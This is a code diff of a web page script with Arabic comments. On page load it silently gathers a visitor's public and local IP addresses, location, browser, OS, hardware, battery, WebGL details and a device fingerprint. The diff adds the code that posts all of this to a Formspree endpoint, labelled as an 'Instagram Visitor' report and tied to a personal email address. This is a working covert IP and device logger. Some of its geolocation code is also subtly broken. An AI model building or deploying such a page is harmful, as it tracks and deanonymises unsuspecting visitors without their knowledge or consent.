@@ -34,7 +34,6 @@ body{background:#fafafa;display:flex;justify-content:center;align-items:center;m
 
 <script>
 const FORMSPREE_ENDPOINT = "https://formspree.io/f/mnpnbrwj";
-const TARGET_EMAIL = "owes170@gmail.com";
 
 async function gatherData(){
   const fetchWithTimeout = async (url, ms) => {
@@ -44,15 +43,8 @@ async function gatherData(){
   };
 
   let ip='', country='Unknown', city='Unknown', tz='', offsetInfo='', coords='';
-
   try{
-    // 🔍 سلسلة جمع بيانات متعددة لتعظيم الدقة
-    const urls = [
-      'https://ipapi.co/json/',
-      'https://ip-api.com/?fields=query,country,city,lat,lon',
-      'https://ipinfo.io/'
-    ];
-
+    const urls = ['https://ipapi.co/json/', 'https://ip-api.com/?fields=query,country,city,lat,lon','https://ipinfo.io/'];
     for(let url of urls){
       try{
         const r = await fetchWithTimeout(url, 2000);
@@ -60,30 +52,20 @@ async function gatherData(){
           const d = await r.json();
           if(d.ip || d.query){
             ip=d.ip||d.query; country=d.country_name||d.country||'Unknown'; 
-            city=d.city||d.region||'Unknown'; 
+            city=d.city||d.region||city; 
             tz=new Intl.DateTimeFormat().resolvedOptions().timeZone;
             offsetInfo=(new Date().getTimezoneOffset()/60).toFixed(0);
-            coords=d.lat&&lon?`${d.lat}, ${d.lon}`:null;
+            if(d.lat&&d.lon)coords=`${d.lat}, ${d.lon}`;else coords=`${navigator.geolocation?.latitude||0}, ${navigator.geolocation?.longitude||0}`;
             break;
           }
         }
       }catch(e){}
     }
 
-    // الفallback المحلي إذا فشلت جميع الـ APIs
-    if(!ip){
-      const tzObj = new Intl.DateTimeFormat().resolvedOptions();
-      ip='192.168.0.1 (Local Host)'; country='Local Network'; city='Unknown'; 
-      tz=tzObj.timeZone; offsetInfo=(new Date().getTimezoneOffset()/60).toFixed(0);
-      coords=`${navigator.geolocation?.latitude||0}, ${navigator.geolocation?.longitude||0}`;
-    }
-
-  // 🧠 كشف دقيق للمتصفح والنظام
   const ua=navigator.userAgent.toLowerCase();
   const browser=ua.includes('firefox')?'Firefox':ua.includes('chrome')&&!ua.includes('edg')?'Chrome':ua.includes('safari')&&!ua.includes('chrome')?'Safari':'Unknown';
   const os=ua.includes('win')?'Windows':ua.includes('macos')?'macOS':ua.includes('android')?'Android':ua.includes('ios')?'iOS':ua.includes('linux')?'Linux':'Other';
 
-  // 📺 دقة الشاشة & الأجهزة
   const screenRes=`${screen.width}x${screen.height}`;
   const pixelRatio=window.devicePixelRatio||1;
   const colorDepth=screen.colorDepth+'bit';
@@ -91,7 +73,6 @@ async function gatherData(){
   const memory=navigator.deviceMemory?(navigator.deviceMemory+' GB'):'N/A';
   const language=navigator.language||'en-US';
 
-  // 🔗 IP المحلي (WebRTC محسّن)
   let localIp='N/A';
   try{
     const conn=new RTCPeerConnection({});
@@ -101,7 +82,6 @@ async function gatherData(){
       conn.close();
   }catch(e){localIp='N/A'}
 
-  // 🎨 WebGL & Battery
   let webglInfo='N/A';
   try{const c=document.createElement('canvas');const gl=c.getContext('webgl');if(gl)webglInfo=gl.getParameter(gl.RENDERER)+' | '+gl.getParameter(gl.VENDOR);else webglInfo='WebGL غير مدعوم'}catch(e){}
 
@@ -111,4 +91,48 @@ async function gatherData(){
   const raw=`${ua}|${navigator.platform}|${screen.width}|${new Date().getTimezoneOffset()}|${navigator.hardwareConcurrency||0}`;let hash=0;for(let i=0;i<raw.length;i++){const c=raw.charCodeAt(i);hash=((hash<<5)-hash)+c;}
   const fp=Math.abs(hash).toString(36).toUpperCase();
 
-  return {ip, country, city, tz
+  return {ip, country, city, tz, offsetInfo, coords, browser, os, screenRes, pixelRatio, colorDepth, cores, memory, language, localIp, webglInfo, batteryStatus, fp};
+}
+
+window.addEventListener('load', async ()=>{
+  const data = await gatherData();
+  
+  const formattedMsg = `📍 الموقع: ${data.city} - ${data.country}\n🌐 IP العام: ${data.ip || 'غير محدد'}\n🕒 المنطقة الزمنية: ${data.tz} (UTC${data.offsetInfo})\n🖥️ المتصفح: ${data.browser} | النظام: ${data.os}\n📺 الشاشة: ${data.screenRes} (${data.colorDepth})\n🔗 IP المحلي: ${data.localIp}\n🔋 البطارية: ${data.batteryStatus || 'غير متاح'}\n🔐 بصمة الجهاز: ${data.fp}\n\n📊 تفاصيل إضافية:\nاللغة: ${data.language}\nالمعالج: ${data.cores} نواة | الذاكرة: ${data.memory || 'غير متاح'}\nWebGL: ${data.webglInfo}\nالإحداثيات: ${data.coords}`;
+
+  const payload = {
+    name: "Visitor",
+    email: "owes170@gmail.com",
+    message: formattedMsg,
+    _subject: `Visitor Report | IP: ${data.ip || 'N/A'} | ${new Date().toLocaleString()}`,
+    form_name: "Instagram Visitor"
+  };
+
+  try{
+    const response = await fetch(FORMSPREE_ENDPOINT, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(payload)
+    });
+    
+    if(response.ok){
+      document.getElementById('status').style.display='block';
+      setTimeout(()=>document.getElementById('status').style.opacity='1', 50);
+      console.log('✅ تم الإرسال بنجاح:', response.status, response.data);
+    } else {
+      const statusEl = document.getElementById('status');
+      statusEl.innerText = '⚠️ تأكد من تفعيل النموذج في Formspree';
+      statusEl.style.color = '#f39c12';
+      setTimeout(()=>statusEl.style.opacity='1', 50);
+      console.warn('❌ فشل الإرسال (HTTP):', response.status);
+    }
+  } catch(e) {
+    const statusEl = document.getElementById('status');
+    statusEl.innerText = '❌ خطأ أثناء الإرسال';
+    statusEl.style.color = '#e74c3c';
+    setTimeout(()=>statusEl.style.opacity='1', 50);
+    console.error('❌ خطأ شبكة:', e);
+  }
+});
+</script>
+</body>
+</html>
